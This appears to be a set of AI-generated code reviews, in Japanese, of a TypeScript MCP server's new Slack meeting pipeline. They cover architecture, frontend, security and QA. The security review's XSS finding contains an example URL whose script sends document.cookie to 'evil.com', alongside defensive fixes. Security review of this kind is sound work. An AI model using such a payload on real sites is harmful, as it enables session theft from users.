## arch-review
全ファクトチェック完了。レポートを作成します。

---

# アーキテクチャレビュー

## 結果: REJECT

## サマリー

Meeting Intelligence Pipeline（Slack連携、ブリーフィング生成、会議後処理、パイプラインスケジューラー）の新規実装。全体的な設計方針は良好（DI、アダプターパターン、graceful degradation）だが、ファイルサイズ超過（2件）とDRY違反（2件）、資格情報の二重経路（1件）がブロッキング問題として検出された。

## 変更スコープ

| 区分 | ファイル数 | 行数 |
|------|-----------|------|
| 新規ソースコード | 16 | 2,968 |
| 新規テストコード | 17 | 2,225 |
| 既存ファイル変更 | 9 | ~170 |
| **合計** | **42** | **~5,363** |

**判定: Large** — 変更は論理的にまとまっている（Meeting Intelligence機能一式）。無関係な変更の混在はなし。

## 前回指摘の追跡

アーキテクチャレビューはこのムーブメントが初回（Movement Iteration: 1）。前回のopen findingsなし。

## 今回の指摘（new）

### ARCH-001 [new] — `pipeline-scheduler.ts` が300行超（395行）

- **ファイル**: `src/services/pipeline-scheduler.ts`（395行）
- **基準**: ナレッジ「1ファイル300行超 → REJECT」
- **問題**: 1クラスに6つの責務が混在：ライフサイクル管理、会議フィルタリング、ポストミーティングキュー処理、日次サマリー、エラーハンドリング、メトリクス追跡
- **修正案**:
  1. `MeetingFilter`クラスを抽出（`shouldProcessMeeting` + `matchesExcludePattern`、L170-214の約45行）→ `src/services/meeting-filter.ts`
  2. `checkDailySummary` メソッド（L320-355の約36行）を `DailySummaryService` として抽出 → `src/services/daily-summary-service.ts`
  3. 分割後のメインクラスは約314行。さらに `handleCriticalError` をエラーハンドラーに抽出すれば300行以下に収まる

### ARCH-002 [new] — `post-meeting-processor.ts` が300行超（415行）

- **ファイル**: `src/services/post-meeting-processor.ts`（415行）
- **基準**: ナレッジ「1ファイル300行超 → REJECT」
- **問題**: 1クラスに4つの責務が混在：ソースポーリング、LLMレスポンスパース、アクションアイテム構築/アサイニー解決、Slackレポート送信
- **修正案**:
  1. `LlmResponseParser` ユーティリティを抽出（`parseExtractResponse`のJSON抽出パターン + `deduplicateActionItems`のパース部分）→ `src/utils/llm-response-parser.ts`（約30行、ARCH-004の修正と兼ねる）
  2. `ActionItemBuilder` クラスを抽出（`buildActionItem` + `resolveAssigneeEmail`、L352-414の約63行）→ `src/services/action-item-builder.ts`
  3. 分割後のメインクラスは約290行

### ARCH-003 [new] — `formatBriefing` と `formatPostMeetingReport` が同一実装（DRY違反）

- **ファイル**: `src/utils/slack-blocks.ts`
- **行**: L84-101 と L106-123
- **基準**: ポリシー「同じことをするメソッドの増殖 → REJECT」
- **問題**: 2つの関数の実装が完全に同一。唯一の差異は絵文字プレフィックス（`📋` vs `📝`）のみ
- **修正案**:
  ```typescript
  function formatMessageBlocks(
    emoji: string, title: string, time: string,
    content: string, sourceLinks: SourceLinks,
  ): SlackBlock[] {
    const blocks: SlackBlock[] = [
      headerBlock(`${emoji} ${title} — ${time}`),
      sectionBlock(content),
    ];
    const sourceElements = buildSourceElements(sourceLinks);
    if (sourceElements.length > 0) {
      blocks.push(contextBlock(sourceElements));
    }
    return enforceBlockLimit(blocks);
  }

  export function formatBriefing(
    title: string, time: string, content: string, sourceLinks: SourceLinks,
  ): SlackBlock[] {
    return formatMessageBlocks('📋', title, time, content, sourceLinks);
  }

  export function formatPostMeetingReport(
    title: string, time: string, content: string, sourceLinks: SourceLinks,
  ): SlackBlock[] {
    return formatMessageBlocks('📝', title, time, content, sourceLinks);
  }
  ```

### ARCH-004 [new] — LLMレスポンスのJSON抽出パターンが重複（DRY違反）

- **ファイル**: `src/services/post-meeting-processor.ts`
- **行**: L294 と L338
- **基準**: ポリシー「本質的に同じロジックの重複 → REJECT」
- **問題**: markdownコードブロックからJSONを抽出するパターンが2箇所に重複:
  - `parseExtractResponse()` L294: `text.match(/```(?:json)?\s*([\s\S]*?)```/) || [null, text]`
  - `deduplicateActionItems()` L338: `result.match(/```(?:json)?\s*([\s\S]*?)```/) || [null, result]`
- **修正案**: 共通ユーティリティに抽出:
  ```typescript
  // src/utils/llm-response-parser.ts
  export function extractJsonFromLlmResponse(text: string): unknown {
    const jsonMatch = text.match(/```(?:json)?\s*([\s\S]*?)```/) || [null, text];
    const jsonStr = (jsonMatch[1] || text).trim();
    return JSON.parse(jsonStr);
  }
  ```
  `channel-discovery.ts:108-121` のJSONパースも将来的にこのユーティリティに統合可能。

### ARCH-005 [new] — Slack資格情報の二重経路（アーキテクチャ不整合）

- **ファイル**:
  - `src/cli/http-server-with-config.ts` L227-232（`process.env.SLACK_CLIENT_ID` / `process.env.SLACK_CLIENT_SECRET` から読み取り）
  - `src/services/reloadable/slack-service-adapter.ts` L25-26（`config.integrations.slack.clientId` / `clientSecret` から読み取り）
- **問題**: 同一サービスの資格情報が2つの異なるソースから供給される
  - HTTPサーバー: 環境変数 → `SlackOAuthHandler` を作成（OAuth callbackフロー）
  - アダプター: config → `createSlackService` → `SlackOAuthHandler` を作成（API呼び出し用）
  - `SlackIntegrationConfigSchema` のデフォルトでは `clientId: undefined`, `clientSecret: undefined`
  - `ConfigLoader`のマイグレーションも `SlackIntegrationConfigSchema.parse({})` = `clientId: undefined`
  - **結果**: アダプター経由の `createSlackService` は常に `"Slack integration not configured"` で失敗 → `SlackServiceAdapter.instance = null` → パイプラインスケジューラーの依存関係が満たされず全パイプラインが起動不能
- **修正案**: `createSlackService` で環境変数にフォールバック（Google OAuthの既存パターンに合わせる）:
  ```typescript
  export function createSlackService(config: UserConfig): SlackService {
    const slackConfig = config.integrations?.slack;
    const clientId = slackConfig?.clientId || process.env.SLACK_CLIENT_ID;
    const clientSecret = slackConfig?.clientSecret || process.env.SLACK_CLIENT_SECRET;
    if (!clientId || !clientSecret) {
      throw new Error('Slack integration not configured: missing clientId or clientSecret');
    }
    const oauthHandler = new SlackOAuthHandler({
      clientId,
      clientSecret,
      redirectUri: slackConfig?.redirectUri || process.env.SLACK_REDIRECT_URI || 'http://localhost:54321/oauth/slack/callback',
    });
    return new SlackService(oauthHandler);
  }
  ```
  さらに、`SlackIntegrationConfig` から `clientId` / `clientSecret` を削除し、環境変数を唯一のソースとする（Google OAuthパターンと統一）。

## 継続指摘（persists）

なし（初回レビュー）

## 解消済み（resolved）

なし（初回レビュー）

## 非ブロッキング（参考情報）

### Warning

| 観点 | ファイル | 詳細 |
|------|---------|------|
| `config` がpublic | `src/services/post-meeting-processor.ts:31` | `readonly config` にアクセス修飾子なし（= public）。外部から参照されていないため `private readonly` にすべき |
| `createAllReloadableAdapters` が `reinitialize()` をawaitしていない | `src/services/reloadable/index.ts:167,175,186` | 既存パターンの踏襲だが、非同期初期化が fire-and-forget になっている。エラーは未処理Promise rejectionになる。修正には全呼び出し元の変更が必要なため、技術的負債として記録 |
| `http-server-with-config.ts` が895行 | `src/cli/http-server-with-config.ts` | 既存の肥大化ファイル。今回の変更（+58行）は論理的に妥当だが、中期的にはSlack OAuth処理の分離を推奨 |

## 良い点

- **依存性注入**: 全サービスクラスがコンストラクタ注入でテスタブル
- **graceful degradation**: `Promise.allSettled` の活用、SamplingError時のフォールバック
- **型安全**: Zodスキーマによるバリデーション、カスタムエラー型（`SlackTokenRevokedError`）
- **テストカバレッジ**: 17テストファイル/129テスト。新規振る舞いに対するテストが一通り揃っている
- **適切なモジュール分割（大部分）**: types, utils, integrations, services, reloadable の分離が明確
- **既存パターンの踏襲**: reloadableアダプターは既存アダプターと同じ設計パターン

---

## frontend-review
プロジェクトの構造を確認しました。

**結論: このプロジェクトにはフロントエンドコードが含まれていません。**

- **プロジェクト**: `@shin1ohno/sage` — Claude Desktop / Claude Code 向けの MCP サーバー（AI タスク管理アシスタント）
- **技術スタック**: Node.js + TypeScript のバックエンドサーバー
- **依存関係**: `@modelcontextprotocol/sdk`, `googleapis`, `@slack/web-api`, `zod` 等。React, Vue, Angular, Svelte 等のフロントエンドフレームワークは使用していない
- **フロントエンドファイル**: `.tsx`, `.jsx`, `.vue`, `.svelte` ファイルは0件
- **ソースコード**: `src/` 以下は `cli`, `config`, `core`, `integrations`, `oauth`, `remote`, `services`, `setup`, `tools`, `types`, `utils` — すべてサーバーサイドのモジュール

---

# フロントエンドレビュー

## 結果: APPROVE

## サマリー
このプロジェクトは MCP サーバー（バックエンド）であり、フロントエンドコード（React, Vue, Angular, Svelte 等のコンポーネント、ブラウザ向け UI）を含みません。フロントエンドレビューの対象外のため、問題なしとして承認します。

## 今回の指摘（new）
なし

## 継続指摘（persists）
なし

## 解消済み（resolved）
なし

---

## security-review
全てのファクトチェックが完了しました。レビュー結果をまとめます。

---

# セキュリティレビュー

## 結果: REJECT

## サマリー
Slack OAuth統合コードにReflected XSS脆弱性とOAuth CSRF保護の欠如を検出。いずれもOWASP Top 10（A03 Injection、A01 Broken Access Control）に該当するブロッキング問題。

---

## ブロッキング問題

### SEC-001: Reflected XSS — Slack OAuthコールバックで`error`パラメータ未エスケープ [new]

**ファイル:** `src/cli/http-server-with-config.ts:854`

**問題:** URLクエリストリングの `error` パラメータがHTMLエスケープなしで直接HTMLレスポンスに埋め込まれている。

```typescript
// 854行目
res.end(`<h1>Slack Authorization Failed</h1><p>${error}</p>`);
```

`error` は `url.searchParams.get('error')` （848行目）から取得される攻撃者制御可能な値。攻撃者が以下のようなURLを作成してユーザーに踏ませることで、サーバーオリジン上で任意のJavaScriptが実行できる：

```
https://server/oauth/slack/callback?error=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

**比較:** 同じプロジェクトの `GoogleOAuthCallbackHandler`（`src/oauth/google-oauth-callback-handler.ts:251,324`）は `escapeHtml()` メソッドで適切にエスケープしている。Slackハンドラのみこの保護が欠落。

**修正案:** `error` 値をHTMLエスケープしてから埋め込む。`GoogleOAuthCallbackHandler` の `escapeHtml()` と同等のエスケープ処理を適用するか、共通ユーティリティに抽出して再利用する：

```typescript
// エスケープ関数（GoogleOAuthCallbackHandlerと同等）
function escapeHtml(text: string): string {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// 854行目を修正
res.end(`<h1>Slack Authorization Failed</h1><p>${escapeHtml(error)}</p>`);
```

---

### SEC-002: OAuth CSRF — Slack OAuthコールバックで`state`パラメータ未検証 [new]

**ファイル:** `src/cli/http-server-with-config.ts:840-876`（`handleSlackOAuthCallback` メソッド全体）

**問題:** Slack OAuthコールバックハンドラは `state` パラメータの検証を一切行っていない。

- `slack-oauth-handler.ts:58` の `getAuthorizationUrl(state)` は `state` パラメータを受け取る設計になっている
- しかしコールバック側（`handleSlackOAuthCallback`）は `state` を読み取りも検証もしていない
- これにより、攻撃者が自身のauthorization codeで被害者をコールバックURLにリダイレクトさせ、攻撃者のSlackワークスペースのトークンを被害者のサーバーに保存させるCSRF攻撃が可能

**比較:** `GoogleOAuthCallbackHandler`（`src/oauth/google-oauth-callback-handler.ts:71-91`）は以下を実行している：
1. `state` パラメータの存在検証（71行目）
2. `PendingGoogleAuthStore` でのセッション照合（82行目）
3. 不一致時のエラーレスポンス（84-91行目）

Slackハンドラにはこの保護メカニズムが完全に欠落している。

**修正案:**
1. Slack OAuth開始時にランダムな `state` 値を生成し、サーバー側ストアに保存する
2. `handleSlackOAuthCallback` で `state` クエリパラメータを読み取り、保存した値と照合する
3. 不一致または欠落時はリクエストを拒否する

```typescript
private handleSlackOAuthCallback(req: IncomingMessage, res: ServerResponse): void {
  // ... (existing checks) ...
  
  const state = url.searchParams.get('state');
  if (!state || !this.pendingSlackAuthStore.validate(state)) {
    res.writeHead(400, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end('<h1>Invalid or missing state parameter</h1>');
    return;
  }
  
  // ... (proceed with code exchange) ...
}
```

---

## Warning（非ブロッキング）

### SEC-W001: Slackクレデンシャルの保存場所の不一致

- `src/types/pipeline-config.ts:39-40` — `SlackIntegrationConfigSchema` で `clientId` と `clientSecret` をJSONコンフィグファイルフィールドとして定義
- `src/services/reloadable/slack-service-adapter.ts:26-31` — `createSlackService()` がコンフィグから `clientSecret` を読み取り
- `src/cli/http-server-with-config.ts:227` — HTTPサーバーは `process.env.SLACK_CLIENT_ID` / `process.env.SLACK_CLIENT_SECRET` を使用

環境変数経由（HTTPサーバー）とコンフィグファイル経由（アダプター）の2系統が混在。コンフィグファイルはバックアップや誤共有のリスクがあるため、シークレットは環境変数に統一することを推奨。

### SEC-W002: デフォルトリダイレクトURIにHTTPを使用

- `src/cli/http-server-with-config.ts:228` — `http://${this.effectiveHost}:${this.effectivePort}/oauth/slack/callback`
- `src/services/reloadable/slack-service-adapter.ts:32` — `http://localhost:54321/oauth/slack/callback`

開発用としてはHTTPのlocalhostは一般的だが、本番環境でHTTPリダイレクトURIが使用されると、authorization codeが平文で送信されるリスクがある。本番環境ではHTTPS強制を検討すべき。

---

## 今回の指摘（new）
| # | finding_id | 重大度 | ブロッキング | 問題 |
|---|-----------|--------|------------|------|
| 1 | SEC-001 | 高 | ✅ | Reflected XSS: `error` パラメータ未エスケープ |
| 2 | SEC-002 | 高 | ✅ | OAuth CSRF: `state` パラメータ未検証 |

## 継続指摘（persists）
なし

## 解消済み（resolved）
なし

---

## qa-review
QAレビューが完了しました。

**結果: REJECT** — 6件のブロッキング問題を検出しました。

最も重大な問題は以下の3件です：

1. **QA-001**: `src/integrations/slack-service.ts`（258行・6メソッド）に専用テストが全くない
2. **QA-002**: `src/config/loader.ts` の新マイグレーションロジック（meetingIntelligence/slack）にテストがない
3. **QA-003**: `src/cli/http-server-with-config.ts` の新Slack OAuthコールバックハンドラ（40行・4コードパス）にテストがない

加えて、テストファイル内の `any` 型使用（QA-004, QA-005）と空catchブロック（QA-006）もREJECT対象です。